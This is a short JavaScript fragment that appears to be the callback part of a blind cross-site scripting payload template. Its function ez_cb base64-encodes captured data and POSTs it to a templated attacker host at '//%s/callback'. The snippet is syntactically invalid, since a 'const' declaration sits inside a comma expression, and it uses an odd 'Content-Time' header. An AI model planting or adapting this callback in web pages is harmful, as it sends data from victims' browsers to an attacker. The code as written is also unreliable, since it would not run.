...
function ez_cb(e){var t=new XMLHttpRequest;t.open("POST","//%s/callback",!0),t.setRequestHeader("Content-Time","%s"),t.setRequestHeader("Content-type","text/plain"),t.onreadystatechange=function(){4==t.readyState&&t.status},const base64Data = btoa(JSON.stringify(e)),t.send(base64Data)}
